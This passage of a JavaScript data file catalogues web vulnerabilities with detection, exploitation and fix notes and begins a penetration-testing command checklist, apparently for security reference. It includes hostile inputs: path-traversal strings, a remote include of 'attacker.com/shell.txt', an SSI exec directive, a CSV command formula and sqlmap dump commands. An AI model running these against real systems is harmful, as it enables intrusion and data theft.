  { name: "Remote Code Execution (RCE)", severity: "Critical", description: "Attacker can execute arbitrary code on the target server through vulnerabilities in the application, framework, or dependencies", detection: "Test for command injection, deserialization flaws, template injection, file upload vulnerabilities, and known CVEs", exploitation: "Execute system commands, install backdoors, pivot to internal network, exfiltrate data", remediation: "Avoid passing user input to system commands; use safe APIs; keep all software updated; implement WAF rules" },
  { name: "Local File Inclusion (LFI)", severity: "High", description: "Application includes files based on user input without proper validation, allowing reading of sensitive files or code execution", detection: "Test file parameters with ../../etc/passwd; check for PHP wrappers (php://filter); test null byte truncation", exploitation: "Read configuration files, source code, /etc/shadow; achieve RCE via log poisoning or PHP wrappers", remediation: "Avoid dynamic file inclusion; use allowlists for allowed files; validate and canonicalize file paths" },
  { name: "Remote File Inclusion (RFI)", severity: "Critical", description: "Application includes remote files based on user input, allowing an attacker to execute code hosted on their server", detection: "Test file parameters with http://attacker.com/shell.txt; verify allow_url_include is enabled in PHP", exploitation: "Include a remote PHP shell to achieve full RCE on the target server", remediation: "Disable allow_url_include in PHP; use allowlists; validate all file paths server-side" },
  { name: "Server-Side Request Forgery (SSRF)", severity: "High", description: "Application makes server-side HTTP requests using user-supplied URLs without proper validation", detection: "Supply internal IP addresses (127.0.0.1, 169.254.169.254); use Burp Collaborator for blind detection", exploitation: "Access internal services, read cloud metadata, port scan internal network, interact with databases", remediation: "Validate and sanitize URLs; use allowlists; block internal IP ranges; disable unnecessary URL schemes" },
  { name: "XML External Entity (XXE)", severity: "High", description: "XML parser processes external entity declarations in user-supplied XML, enabling file reading and SSRF", detection: "Submit XML with DOCTYPE and ENTITY declarations; test for blind XXE with out-of-band callbacks", exploitation: "Read local files, perform SSRF, execute denial of service (Billion Laughs), exfiltrate data via OOB", remediation: "Disable DTD processing; disable external entity resolution; use JSON instead of XML where possible" },
  { name: "Insecure Direct Object Reference (IDOR)", severity: "High", description: "Application exposes internal object references (database IDs, file names) without authorization checks", detection: "Modify object identifiers in requests; try accessing other users' resources by changing IDs", exploitation: "Access, modify, or delete other users' data including personal information, financial records, and documents", remediation: "Implement access control checks for every object access; use indirect reference maps or UUIDs" },
  { name: "Cross-Site Request Forgery (CSRF)", severity: "Medium", description: "Attacker tricks authenticated user into submitting a malicious request using their valid session", detection: "Check for missing CSRF tokens; test if state-changing operations work without proper anti-CSRF measures", exploitation: "Change victim's email/password, make purchases, transfer funds, modify account settings", remediation: "Implement anti-CSRF tokens; use SameSite cookie attribute; verify Origin and Referer headers" },
  { name: "Authentication Bypass", severity: "Critical", description: "Application authentication mechanisms can be circumvented through logic flaws or default credentials", detection: "Test for default credentials, SQL injection in login, JWT manipulation, and logic flaws in auth flow", exploitation: "Gain unauthorized access to admin panels, other users' accounts, or protected functionality", remediation: "Implement robust authentication with MFA; use proven authentication frameworks; test auth logic thoroughly" },
  { name: "Privilege Escalation (Horizontal)", severity: "High", description: "User accesses resources or functionality belonging to another user with the same privilege level", detection: "Log in as user A, try accessing user B's resources by modifying identifiers in requests", exploitation: "Access other users' personal data, modify their settings, view their transactions", remediation: "Check resource ownership in every request handler; use session-based authorization, not client-supplied IDs" },
  { name: "Privilege Escalation (Vertical)", severity: "Critical", description: "Lower-privileged user gains access to higher-privileged functionality or resources", detection: "Access admin endpoints as regular user; modify role parameters; test for missing function-level access controls", exploitation: "Gain admin access, modify system configuration, create new admin accounts, access all user data", remediation: "Implement role-based access control; check permissions on every request; deny by default" },
  { name: "Insecure Deserialization", severity: "Critical", description: "Application deserializes untrusted data without validation, leading to RCE, replay attacks, or privilege escalation", detection: "Identify serialized data in cookies, parameters, or APIs; test with gadget chain payloads", exploitation: "Achieve remote code execution, modify application logic, escalate privileges", remediation: "Never deserialize untrusted data; use safe serialization formats like JSON; implement integrity checks" },
  { name: "Broken Access Control", severity: "Critical", description: "Restrictions on authenticated users are not properly enforced, allowing unauthorized access to functionality and data", detection: "Test with different user roles; check for horizontal and vertical privilege escalation; test API endpoints without authentication", exploitation: "Access admin functions, modify other users' data, bypass payment flows, export sensitive data", remediation: "Implement centralized access control; deny by default; enforce ownership checks; log access control failures" },
  { name: "Security Misconfiguration", severity: "Medium", description: "Insecure default configurations, incomplete configuration, open cloud storage, misconfigured HTTP headers, or unnecessary services create security gaps", detection: "Scan with Nikto, Nessus; check security headers; test for default credentials; enumerate services", exploitation: "Access admin interfaces, read configuration files, exploit default credentials, abuse verbose errors", remediation: "Harden all environments; use security checklists; automate configuration auditing; remove unused features" },
  { name: "Sensitive Data Exposure", severity: "High", description: "Application does not adequately protect sensitive data such as credentials, financial data, or personal information", detection: "Check for plaintext transmission (HTTP); test for weak cryptography; review data storage mechanisms", exploitation: "Intercept credentials via MITM, crack weak hashes, access unencrypted databases, read backup files", remediation: "Encrypt data in transit (TLS 1.2+) and at rest; use strong algorithms; implement proper key management" },
  { name: "Buffer Overflow", severity: "Critical", description: "Writing data beyond allocated memory buffer boundaries, potentially allowing code execution or system crashes", detection: "Send oversized input to all parameters; use fuzzing tools (AFL, libFuzzer); perform static code analysis", exploitation: "Overwrite return addresses for RCE, crash applications, bypass security controls", remediation: "Use memory-safe languages; implement bounds checking; enable stack canaries, ASLR, DEP/NX" },
  { name: "Integer Overflow", severity: "High", description: "Arithmetic operation produces a result outside the representable range, causing unexpected behavior", detection: "Test with maximum integer values, negative numbers, and boundary conditions; perform code review", exploitation: "Bypass size checks, cause buffer overflows, manipulate financial calculations", remediation: "Validate integer ranges; use safe integer arithmetic libraries; implement bounds checking" },
  { name: "Format String Vulnerability", severity: "Critical", description: "User input is used as a format string argument, allowing memory reading/writing and code execution", detection: "Supply format specifiers (%x, %s, %n) as input; observe memory leaks or crashes", exploitation: "Read memory contents, write arbitrary memory, achieve code execution", remediation: "Never use user input as format strings; use fixed format strings with user data as arguments" },
  { name: "Use After Free", severity: "Critical", description: "Program continues to use a memory reference after it has been freed, leading to corruption or code execution", detection: "Fuzz with AddressSanitizer; perform dynamic analysis with Valgrind; static analysis tools", exploitation: "Achieve code execution by placing controlled data in freed memory regions", remediation: "Null pointers after free; use smart pointers; employ memory-safe languages" },
  { name: "Clickjacking", severity: "Medium", description: "Attacker overlays a transparent frame over a legitimate page, tricking users into clicking unintended elements", detection: "Check for missing X-Frame-Options and CSP frame-ancestors; test with iframe embedding", exploitation: "Trick users into clicking buttons (delete account, change settings, authorize transactions)", remediation: "Set X-Frame-Options: DENY or SAMEORIGIN; use CSP frame-ancestors; implement frame-busting JavaScript" },
  { name: "Open Redirect", severity: "Low", description: "Application redirects users to a URL specified by an unvalidated parameter, enabling phishing attacks", detection: "Modify redirect parameters to point to external domains; check for URL parsing inconsistencies", exploitation: "Redirect users to phishing pages that mimic the legitimate site; chain with OAuth token theft", remediation: "Validate redirect URLs against an allowlist; use relative redirects; avoid passing URLs as parameters" },
  { name: "HTTP Response Splitting", severity: "Medium", description: "CRLF injection in HTTP headers allows an attacker to split the response and inject malicious content", detection: "Inject %0d%0a in header values; check for reflected CRLF characters in responses", exploitation: "Cache poisoning, XSS via injected response body, session fixation", remediation: "Strip CRLF from all user input used in HTTP headers; use framework functions for header setting" },
  { name: "Directory Traversal", severity: "High", description: "Attacker can access files and directories outside the intended directory using ../ sequences", detection: "Test file path parameters with ../../../etc/passwd; try URL encoding and double encoding", exploitation: "Read configuration files, source code, credentials, and system files", remediation: "Canonicalize paths; validate against intended directory; use chroot or containerization" },
  { name: "Information Disclosure", severity: "Medium", description: "Application reveals sensitive information through error messages, headers, comments, or exposed files", detection: "Trigger errors; check HTTP headers; view page source for comments; scan for exposed files", exploitation: "Gather internal architecture details, version information, file paths, and credentials for further attacks", remediation: "Implement custom error pages; remove debug info; strip server headers; audit deployed files" },
  { name: "Mass Assignment", severity: "High", description: "Application automatically binds HTTP request parameters to internal objects without filtering, allowing modification of protected fields", detection: "Add extra parameters (role, isAdmin, verified) to POST/PUT requests; check if they are processed", exploitation: "Elevate privileges, modify protected fields, bypass validation rules", remediation: "Use allowlists for assignable fields; implement DTOs; validate all bound properties" },
  { name: "Race Condition", severity: "High", description: "Application behavior depends on timing of events, allowing exploitation through concurrent requests", detection: "Send concurrent requests for time-sensitive operations; use Turbo Intruder or race-the-web", exploitation: "Double-spend tokens, bypass limits, create duplicate resources, escalate privileges", remediation: "Use database-level locking; implement idempotency keys; use atomic operations" },
  { name: "Server-Side Template Injection (SSTI)", severity: "Critical", description: "User input is embedded in server-side templates without sanitization, allowing arbitrary code execution", detection: "Test with {{7*7}}, ${7*7}, <%=7*7%>; check if expressions are evaluated", exploitation: "Read files, execute system commands, achieve full RCE on the server", remediation: "Never pass user input as template source; use sandboxed templates; implement allowlists" },
  { name: "Subdomain Takeover", severity: "High", description: "Unclaimed DNS records pointing to cloud services allow an attacker to host content on the target's subdomain", detection: "Enumerate subdomains; check for dangling CNAME records; verify service availability", exploitation: "Host phishing pages, steal cookies (if parent domain scoped), bypass CSP", remediation: "Audit DNS records regularly; remove stale entries; use monitoring tools for subdomain changes" },
  { name: "WebSocket Vulnerabilities", severity: "Medium", description: "WebSocket connections lack proper authentication, authorization, or input validation", detection: "Test WebSocket origin validation; inject payloads in WebSocket messages; test for CSWSH", exploitation: "Hijack WebSocket sessions, inject malicious messages, exfiltrate real-time data", remediation: "Validate Origin header; implement authentication on WebSocket connections; sanitize all message data" },
  { name: "GraphQL Injection", severity: "High", description: "GraphQL endpoints accept malicious queries that bypass authorization, enable data exfiltration, or cause DoS", detection: "Test introspection queries; send deeply nested queries; test for batching and alias-based attacks", exploitation: "Enumerate schema, bypass field-level auth, exfiltrate data, DoS via complex queries", remediation: "Disable introspection; implement query depth/cost limits; use persisted queries; enforce field-level auth" },
  { name: "CORS Misconfiguration", severity: "High", description: "Overly permissive Cross-Origin Resource Sharing policies allow unauthorized cross-origin access to sensitive data", detection: "Send requests with different Origin headers; check if credentials are allowed with wildcards", exploitation: "Read authenticated responses cross-origin, steal user data, perform actions on behalf of user", remediation: "Use strict origin allowlists; never reflect arbitrary origins with credentials; avoid wildcard origins" },
  { name: "JWT Vulnerabilities", severity: "High", description: "Weak JWT implementation allows token forgery through algorithm confusion, weak secrets, or missing validation", detection: "Test none algorithm; try alg switching (RS256->HS256); brute force weak secrets; check exp validation", exploitation: "Forge admin tokens, impersonate other users, bypass authentication entirely", remediation: "Enforce expected algorithm server-side; use strong secrets (256+ bits); validate all claims including exp" },
  { name: "Prototype Pollution", severity: "High", description: "Attacker modifies JavaScript Object.prototype through unsafe merge operations, affecting all object instances", detection: "Send __proto__ or constructor.prototype in JSON payloads; check for recursive merge/extend functions", exploitation: "Bypass security checks, achieve XSS, cause DoS, potentially achieve RCE in server-side JS", remediation: "Use Object.create(null) for dictionaries; freeze Object.prototype; filter dangerous keys from input" },
  { name: "HTTP Request Smuggling", severity: "High", description: "Discrepancies in how front-end and back-end servers process HTTP requests allow request injection", detection: "Send ambiguous Content-Length and Transfer-Encoding headers; use smuggling detection tools", exploitation: "Bypass security controls, poison web cache, steal credentials, chain to XSS", remediation: "Use HTTP/2 end-to-end; normalize request parsing; reject ambiguous requests" },
  { name: "DNS Rebinding", severity: "Medium", description: "Attacker-controlled DNS responses alternate between public and internal IPs to bypass browser same-origin policy", detection: "Test with DNS rebinding tools; check if internal services validate Host headers", exploitation: "Access internal services through victim's browser; interact with local network devices", remediation: "Validate Host headers; implement network segmentation; use DNS pinning" },
  { name: "LDAP Injection", severity: "High", description: "User input is included in LDAP queries without sanitization, allowing query manipulation", detection: "Inject LDAP special characters (*, (, ), \\, NUL); test login with modified LDAP filters", exploitation: "Bypass authentication, enumerate directory entries, modify LDAP objects", remediation: "Escape LDAP special characters; use parameterized LDAP queries; implement input validation" },
  { name: "NoSQL Injection", severity: "High", description: "Attacker injects NoSQL query operators to manipulate database queries in MongoDB, CouchDB, etc.", detection: "Send JSON with $gt, $ne, $regex operators; test for JavaScript injection in $where clauses", exploitation: "Bypass authentication, extract data, modify documents, cause denial of service", remediation: "Validate input types; reject object input where scalar expected; avoid $where; use ODM with schemas" },
  { name: "Insecure File Permissions", severity: "Medium", description: "Files and directories have overly permissive access controls allowing unauthorized read, write, or execution", detection: "Check file permissions with ls -la; look for world-readable config files and SUID/SGID binaries", exploitation: "Read sensitive configuration files, modify application code, escalate privileges via SUID binaries", remediation: "Apply least privilege permissions; remove unnecessary SUID bits; use proper file ownership" },
  { name: "Hardcoded Credentials", severity: "Critical", description: "Credentials are embedded directly in source code, configuration files, or compiled binaries", detection: "Search source code for passwords, API keys, tokens; use tools like truffleHog, git-secrets", exploitation: "Access databases, APIs, admin panels, and third-party services using discovered credentials", remediation: "Use environment variables or secret management systems; rotate compromised credentials immediately" },
  { name: "Unrestricted File Upload", severity: "Critical", description: "Application allows uploading files without proper validation of type, size, or content", detection: "Upload web shells (.php, .jsp, .aspx); test with double extensions; bypass MIME type checks", exploitation: "Achieve remote code execution by uploading and accessing web shells", remediation: "Validate file types server-side; rename uploaded files; store outside webroot; scan for malware" },
  { name: "Unvalidated Redirect", severity: "Low", description: "Application performs redirects using user-supplied destination URLs without validation", detection: "Modify redirect URL parameters; test with external domain URLs and protocol-relative URLs", exploitation: "Redirect to phishing sites; steal OAuth tokens; chain with other vulnerabilities", remediation: "Use allowlists; validate redirect destinations; implement indirect reference maps for redirect targets" },
  { name: "Session Fixation", severity: "Medium", description: "Application does not regenerate session identifiers after authentication, allowing session prediction", detection: "Set a known session ID before login; verify if the same session ID is used after authentication", exploitation: "Hijack user sessions by setting the session ID before the victim authenticates", remediation: "Regenerate session ID after every authentication event; invalidate old sessions" },
  { name: "Insufficient Transport Layer Security", severity: "High", description: "Application does not enforce HTTPS or uses weak TLS configurations allowing traffic interception", detection: "Test with SSLyze, testssl.sh; check for TLS 1.0/1.1; verify HSTS; check certificate validity", exploitation: "Man-in-the-middle attacks, credential interception, session hijacking, data modification", remediation: "Enforce TLS 1.2+; use strong cipher suites; implement HSTS; use valid certificates" },
  { name: "Weak Password Policy", severity: "Medium", description: "Application does not enforce sufficient password complexity or allows commonly used passwords", detection: "Test registration/password change with weak passwords; check minimum length requirements", exploitation: "Brute force or dictionary attacks succeed due to weak passwords", remediation: "Enforce minimum 8 characters with complexity; check against breached password lists; implement MFA" },
  { name: "Missing Rate Limiting", severity: "Medium", description: "Application does not limit the rate of requests, enabling brute force, enumeration, and abuse", detection: "Send rapid repeated requests to login, registration, password reset, and API endpoints", exploitation: "Brute force credentials, enumerate users, abuse API resources, denial of service", remediation: "Implement rate limiting per IP and per user; use progressive delays; add CAPTCHA after failed attempts" },
  { name: "Cryptographic Weakness", severity: "High", description: "Application uses weak, deprecated, or improperly implemented cryptographic algorithms", detection: "Identify encryption algorithms in use; check for MD5, SHA1, DES, RC4; test for ECB mode usage", exploitation: "Crack hashes, decrypt data, forge signatures, perform padding oracle attacks", remediation: "Use AES-256-GCM for encryption; Argon2id for passwords; ECDSA/Ed25519 for signatures" },
  { name: "Insecure Cookie Configuration", severity: "Medium", description: "Session cookies lack security attributes (Secure, HttpOnly, SameSite), increasing attack surface", detection: "Inspect Set-Cookie headers; verify Secure, HttpOnly, SameSite, Path, and Domain attributes", exploitation: "Steal cookies via XSS (missing HttpOnly), intercept via HTTP (missing Secure), CSRF (missing SameSite)", remediation: "Set Secure, HttpOnly, SameSite=Strict/Lax; use proper Path and Domain; set reasonable expiration" },
  { name: "API Key Exposure", severity: "High", description: "API keys are exposed in client-side code, version control, or public documentation", detection: "Search JavaScript source, GitHub repos, and documentation for API keys; use tools like gitrob", exploitation: "Access third-party services, incur costs, exfiltrate data, modify resources", remediation: "Use server-side API calls; implement key rotation; use environment variables; restrict key permissions" },
  { name: "Server-Side Request Forgery via PDF", severity: "High", description: "PDF generation libraries that render HTML can be exploited for SSRF by including internal URLs", detection: "Include iframe/img/link tags pointing to internal services in HTML-to-PDF input", exploitation: "Read internal services, access cloud metadata, port scan internal network", remediation: "Sanitize HTML input for PDF generation; block internal URLs; use network segmentation" },
  { name: "Email Injection", severity: "Medium", description: "User input in email headers or body allows injection of additional recipients or content", detection: "Include CRLF characters in name/email fields; test for Bcc injection", exploitation: "Send spam, phishing emails from legitimate domain, exfiltrate data via email", remediation: "Sanitize email header inputs; use libraries that prevent header injection; validate email addresses" },
  { name: "Insecure Password Storage", severity: "Critical", description: "Passwords stored in plaintext, with weak hashing, or without salting are vulnerable to credential theft", detection: "Review database schema and code for password handling; check for MD5/SHA hashing without salt", exploitation: "Dump database and crack passwords with rainbow tables or dictionary attacks", remediation: "Use Argon2id, bcrypt, or scrypt with unique salts; never store plaintext or reversibly encrypted passwords" },
  { name: "XML Injection", severity: "Medium", description: "User input is included in XML documents without encoding, allowing modification of XML structure", detection: "Inject XML metacharacters (<, >, &, ', \") in input fields used to construct XML", exploitation: "Modify XML structure to change application behavior, bypass validation, inject malicious content", remediation: "XML-encode all user input before inclusion in XML documents; use XML schemas for validation" },
  { name: "Path Traversal via Archive Extraction", severity: "High", description: "Malicious archive files (ZIP, TAR) contain path traversal sequences in filenames to write files outside the extraction directory", detection: "Create archives with ../../ in filenames; test extraction behavior of the application", exploitation: "Overwrite application files, configuration, or deploy web shells", remediation: "Validate extracted file paths; reject entries with path traversal; extract to temporary directory first" },
  { name: "Timing Side Channel", severity: "Medium", description: "Application reveals information through measurable differences in response time for different inputs", detection: "Measure response times for valid vs invalid usernames; detect character-by-character timing differences", exploitation: "Enumerate valid usernames, extract secrets character by character", remediation: "Use constant-time comparison functions; implement uniform response times; add random delays" },
  { name: "Memory Leak", severity: "Medium", description: "Application fails to properly release allocated memory, leading to performance degradation and eventual crashes", detection: "Monitor memory usage over time; use memory profiling tools; perform load testing", exploitation: "Denial of service through memory exhaustion; potential information disclosure from leaked memory", remediation: "Use memory-safe languages; implement proper cleanup; use smart pointers; conduct memory profiling" },
  { name: "Type Juggling", severity: "High", description: "Loose type comparison in languages like PHP allows authentication bypass through type coercion", detection: "Send different types (int, array, null) where strings are expected; test PHP == vs === behavior", exploitation: "Bypass authentication by exploiting loose comparison (0 == 'string' is true in PHP)", remediation: "Use strict comparison operators (===); validate input types explicitly" },
  { name: "Log Injection", severity: "Medium", description: "User input is written to log files without sanitization, allowing log forging or injection", detection: "Include newlines and CRLF in inputs that are logged; check if log entries can be forged", exploitation: "Forge log entries, inject false evidence, exploit log viewers (XSS in log dashboards), waste disk space", remediation: "Sanitize log output; encode special characters; use structured logging formats" },
  { name: "HTTP Parameter Pollution", severity: "Medium", description: "Multiple HTTP parameters with the same name are processed differently by different components, bypassing validation", detection: "Send duplicate parameters (?id=1&id=2); check which value is used by WAF vs application", exploitation: "Bypass WAF rules, bypass input validation, manipulate application logic", remediation: "Normalize parameter handling; reject duplicate parameters; validate after parameter merging" },
  { name: "Server-Side Include (SSI) Injection", severity: "High", description: "User input is included in pages processed by the SSI engine, allowing command execution", detection: "Inject SSI directives: <!--#exec cmd=\"id\" --> in user input", exploitation: "Execute commands on the server, read files, include remote content", remediation: "Disable SSI processing; sanitize user input; use modern template engines instead" },
  { name: "CRLF Injection", severity: "Medium", description: "Carriage return and line feed characters in user input split HTTP headers or log entries", detection: "Inject %0d%0a in URL parameters, headers, and input fields", exploitation: "HTTP response splitting, cache poisoning, XSS via header injection, log injection", remediation: "Strip or reject CRLF characters from all user input used in headers or logs" },
  { name: "Null Byte Injection", severity: "Medium", description: "Null bytes (%00) in input can truncate strings in some languages, bypassing file extension or path checks", detection: "Append %00 to filenames or paths; test if null byte truncates the string", exploitation: "Bypass file type restrictions, directory traversal filters, and input validation", remediation: "Reject null bytes in input; use languages/functions not affected by null byte truncation" },
  { name: "CSV Injection", severity: "Medium", description: "User input included in CSV exports can contain formula payloads that execute when opened in spreadsheet software", detection: "Enter =cmd|'/C calc'!A0 or =HYPERLINK(url) in data fields that appear in CSV exports", exploitation: "Execute commands on the user's machine, exfiltrate data via crafted formulas", remediation: "Prefix cell values starting with =, +, -, @ with a single quote; sanitize CSV output" },
  { name: "Deserialization of Untrusted Data", severity: "Critical", description: "Application deserializes data from untrusted sources, allowing object injection and code execution", detection: "Identify serialized data in cookies, tokens, or messages; test with gadget chain payloads (ysoserial)", exploitation: "Remote code execution, denial of service, authentication bypass, privilege escalation", remediation: "Do not deserialize untrusted data; use allowlists for deserialization classes; prefer JSON" },
  { name: "Exposed Debug Endpoints", severity: "High", description: "Debug endpoints or developer tools are accessible in production, revealing sensitive information or functionality", detection: "Check for /debug, /console, /phpinfo, /server-status, /_profiler, /actuator endpoints", exploitation: "Access application internals, execute code, view configuration, modify runtime behavior", remediation: "Remove or disable all debug endpoints in production; restrict by IP if needed" },
  { name: "Insecure WebView Configuration", severity: "High", description: "Mobile applications use WebView with insecure settings allowing JavaScript execution and file access", detection: "Decompile mobile app; check WebView settings for JavaScript enabled, file access, universal access", exploitation: "Execute JavaScript in app context, access local files, steal credentials", remediation: "Disable unnecessary WebView features; validate URLs loaded in WebView; implement SSL pinning" },
  { name: "Insecure Random Number Generation", severity: "High", description: "Application uses predictable random number generators for security-sensitive operations like tokens and keys", detection: "Analyze generated tokens for patterns; check if Math.random() or similar is used for security", exploitation: "Predict session tokens, password reset tokens, CSRF tokens, or encryption keys", remediation: "Use cryptographically secure random generators (crypto.randomBytes, secrets module)" },
  { name: "Container Escape", severity: "Critical", description: "Vulnerability allows breaking out of a container to access the host operating system", detection: "Check for privileged containers, mounted Docker socket, kernel exploits, capability misconfigurations", exploitation: "Access host filesystem, other containers, cloud metadata, pivot to other systems", remediation: "Use unprivileged containers; limit capabilities; keep kernel updated; use gVisor or Kata containers" },
  { name: "Kubernetes Misconfiguration", severity: "High", description: "Insecure Kubernetes configuration exposes the cluster to unauthorized access and privilege escalation", detection: "Check for overly permissive RBAC, exposed dashboards, insecure pod security policies", exploitation: "Access cluster API, create privileged pods, steal secrets, pivot to other pods and nodes", remediation: "Implement least-privilege RBAC; use pod security standards; restrict network policies; audit configs" },
  { name: "Server Banner Disclosure", severity: "Low", description: "HTTP response headers reveal server software and version information useful for targeted attacks", detection: "Check Server, X-Powered-By, X-AspNet-Version headers; inspect HTML comments", exploitation: "Use version information to find and exploit known vulnerabilities", remediation: "Remove or generalize server headers; strip version information from all responses" },
  { name: "Denial of Service via Resource Exhaustion", severity: "High", description: "Application allows unconstrained resource usage leading to CPU, memory, or disk exhaustion", detection: "Send large payloads; create deeply nested structures; upload large files; send many concurrent requests", exploitation: "Crash the application, degrade performance for all users, exhaust system resources", remediation: "Implement resource limits; set request size limits; use timeouts; implement connection pooling" },
  { name: "Insufficient Entropy", severity: "Medium", description: "Security tokens and keys are generated with insufficient randomness, making them predictable", detection: "Collect multiple tokens; analyze for patterns, sequential values, or time-based seeds", exploitation: "Predict future tokens to hijack sessions, forge password resets, or bypass security controls", remediation: "Use OS-level CSPRNG; ensure 128+ bits of entropy for tokens; use library functions for token generation" },
  { name: "Cache Poisoning", severity: "High", description: "Attacker manipulates cache behavior to serve malicious content to other users", detection: "Identify unkeyed inputs reflected in cached responses; test with X-Forwarded-Host and similar headers", exploitation: "Serve XSS payloads to all users, redirect users to phishing sites, deface cached pages", remediation: "Include all significant inputs in cache keys; use Cache-Control headers; disable caching for dynamic content" },
  { name: "Unicode Normalization Issue", severity: "Medium", description: "Inconsistent Unicode normalization between validation and processing allows filter bypasses", detection: "Test with Unicode homoglyphs and normalization forms (NFC, NFD, NFKC, NFKD)", exploitation: "Bypass input filters, create homograph attacks, bypass access controls", remediation: "Normalize Unicode consistently before validation; use canonical form (NFC); block confusable characters" },
  { name: "Business Logic Bypass", severity: "High", description: "Application business rules can be circumvented by manipulating workflow sequence or parameters", detection: "Skip steps in multi-step processes; manipulate prices, quantities, and discounts; test edge cases", exploitation: "Purchase items for free, bypass payment, skip verification steps, manipulate calculations", remediation: "Enforce business rules server-side; validate state transitions; implement server-side calculations" },
];

// ---------------------------------------------------------------------------
// 4. PENTEST CHECKLIST (50+ items by phase)
// ---------------------------------------------------------------------------

const PENTEST_CHECKLIST = [
  // -- Reconnaissance --
  { phase: "Reconnaissance", item: "Passive DNS enumeration", commands: ["amass enum -passive -d target.com", "subfinder -d target.com", "assetfinder target.com"], tools: ["Amass", "Subfinder", "Assetfinder"] },
  { phase: "Reconnaissance", item: "WHOIS and registrar information", commands: ["whois target.com", "host target.com", "dig target.com any"], tools: ["whois", "host", "dig"] },
  { phase: "Reconnaissance", item: "DNS record enumeration", commands: ["dig target.com any", "dig target.com mx", "dig target.com txt", "dnsrecon -d target.com"], tools: ["dig", "dnsrecon", "dnsenum"] },
  { phase: "Reconnaissance", item: "Subdomain brute force", commands: ["gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", "ffuf -u http://FUZZ.target.com -w wordlist.txt"], tools: ["Gobuster", "ffuf", "Sublist3r"] },
  { phase: "Reconnaissance", item: "Google dorking for sensitive data", commands: ["site:target.com filetype:pdf", "site:target.com inurl:admin", "site:target.com ext:sql | ext:dbf | ext:mdb"], tools: ["Google", "DorkSearch"] },
  { phase: "Reconnaissance", item: "Shodan / Censys search", commands: ["shodan search hostname:target.com", "shodan host <IP>"], tools: ["Shodan", "Censys", "ZoomEye"] },
  { phase: "Reconnaissance", item: "Certificate transparency log search", commands: ["curl 'https://crt.sh/?q=%25.target.com&output=json' | jq '.[].name_value' | sort -u"], tools: ["crt.sh", "Certspotter", "Facebook CT"] },
  { phase: "Reconnaissance", item: "GitHub/GitLab source code reconnaissance", commands: ["gitrob analyze target-org", "trufflehog git https://github.com/target-org/repo"], tools: ["gitrob", "trufflehog", "gitleaks"] },
  { phase: "Reconnaissance", item: "Technology stack identification", commands: ["whatweb target.com", "wappalyzer-cli https://target.com"], tools: ["WhatWeb", "Wappalyzer", "BuiltWith"] },
  { phase: "Reconnaissance", item: "Email address harvesting", commands: ["theHarvester -d target.com -b all", "hunter.io domain search"], tools: ["theHarvester", "Hunter.io", "Phonebook.cz"] },
  { phase: "Reconnaissance", item: "Social media and OSINT", commands: ["sherlock username", "maltego target.com"], tools: ["Sherlock", "Maltego", "SpiderFoot"] },
  { phase: "Reconnaissance", item: "Wayback Machine historical analysis", commands: ["waybackurls target.com | sort -u", "gau target.com"], tools: ["waybackurls", "gau", "Wayback Machine"] },

  // -- Scanning --
  { phase: "Scanning", item: "TCP port scan (full)", commands: ["nmap -sS -p- -T4 --min-rate=1000 -oN tcp_full.txt target.com", "masscan -p1-65535 --rate=1000 target.com"], tools: ["Nmap", "Masscan", "RustScan"] },
  { phase: "Scanning", item: "UDP port scan (top ports)", commands: ["nmap -sU --top-ports 200 -T4 target.com", "nmap -sU -p 53,67,68,69,123,161,162,500,514,1900 target.com"], tools: ["Nmap", "Unicornscan"] },
  { phase: "Scanning", item: "Service version detection", commands: ["nmap -sV -sC -p <ports> target.com", "nmap -A target.com"], tools: ["Nmap"] },
  { phase: "Scanning", item: "Vulnerability scanning", commands: ["nmap --script vuln target.com", "nikto -h target.com", "nuclei -u https://target.com -t cves/"], tools: ["Nmap NSE", "Nikto", "Nuclei", "OpenVAS"] },
  { phase: "Scanning", item: "Web application scanning", commands: ["nikto -h https://target.com", "wpscan --url https://target.com", "nuclei -u https://target.com"], tools: ["Nikto", "WPScan", "Nuclei", "OWASP ZAP"] },
  { phase: "Scanning", item: "Directory and file enumeration", commands: ["gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt", "ffuf -u https://target.com/FUZZ -w wordlist.txt", "feroxbuster -u https://target.com"], tools: ["Gobuster", "ffuf", "Feroxbuster", "dirb"] },
  { phase: "Scanning", item: "SSL/TLS configuration audit", commands: ["testssl.sh https://target.com", "sslyze target.com", "nmap --script ssl-enum-ciphers -p 443 target.com"], tools: ["testssl.sh", "SSLyze", "Nmap"] },
  { phase: "Scanning", item: "Virtual host discovery", commands: ["gobuster vhost -u https://target.com -w vhosts.txt", "ffuf -u https://target.com -H 'Host: FUZZ.target.com' -w wordlist.txt"], tools: ["Gobuster", "ffuf"] },
  { phase: "Scanning", item: "API endpoint discovery", commands: ["ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt", "kiterunner scan https://target.com -w routes.kite"], tools: ["ffuf", "Kiterunner", "Arjun"] },

  // -- Enumeration --
  { phase: "Enumeration", item: "SMB enumeration", commands: ["enum4linux -a target.com", "smbclient -L //target.com -N", "crackmapexec smb target.com --shares"], tools: ["enum4linux", "smbclient", "CrackMapExec"] },
  { phase: "Enumeration", item: "SNMP enumeration", commands: ["snmpwalk -v2c -c public target.com", "onesixtyone -c community.txt target.com"], tools: ["snmpwalk", "onesixtyone", "snmp-check"] },
  { phase: "Enumeration", item: "LDAP enumeration", commands: ["ldapsearch -x -h target.com -b 'dc=target,dc=com'", "nmap -p 389 --script ldap-rootdse target.com"], tools: ["ldapsearch", "Nmap", "ldapenum"] },
  { phase: "Enumeration", item: "NFS enumeration", commands: ["showmount -e target.com", "nmap -sV --script nfs-ls,nfs-showmount target.com"], tools: ["showmount", "Nmap"] },
  { phase: "Enumeration", item: "RPC enumeration", commands: ["rpcclient -U '' -N target.com", "rpcinfo -p target.com"], tools: ["rpcclient", "rpcinfo"] },
  { phase: "Enumeration", item: "User enumeration", commands: ["kerbrute userenum -d target.com usernames.txt", "enum4linux -U target.com"], tools: ["Kerbrute", "enum4linux", "CrackMapExec"] },
  { phase: "Enumeration", item: "Email enumeration", commands: ["smtp-user-enum -M VRFY -U users.txt -t target.com", "nmap --script smtp-enum-users target.com"], tools: ["smtp-user-enum", "Nmap"] },

  // -- Exploitation --
  { phase: "Exploitation", item: "SQL injection exploitation", commands: ["sqlmap -u 'https://target.com/page?id=1' --dbs", "sqlmap -u 'https://target.com/page?id=1' -D dbname --tables --dump"], tools: ["SQLMap", "Ghauri"] },
